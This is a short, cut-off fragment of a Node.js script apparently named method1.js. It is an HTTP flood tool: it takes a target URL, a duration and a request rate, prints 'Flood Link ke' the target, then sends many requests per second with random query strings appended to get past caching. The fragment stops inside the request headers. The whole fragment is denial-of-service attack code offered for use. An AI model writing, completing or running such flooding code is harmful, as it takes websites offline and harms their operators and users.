...
if (小吴参数.length < 3) {
    console.log("Usage: node method1.js <url> <time> <rate>");
    process.exit(-1);
}

const 小吴网址 = 小吴参数[0], 小吴时间 = parseInt(小吴参数[1]), 小吴速率 = parseInt(小吴参数[2]);

console.log(`🔥 Flood Link ke ${小吴网址} selama ${小吴时间}s @ ${小吴速率} req/s`);

const 小吴循环 = setInterval(() => {
    for (let 小吴i = 0; 小吴i < 小吴速率; 小吴i++) {
        小吴请求({
            url: 小吴网址 + '?' + 小吴随机.generate(5),
            headers: {
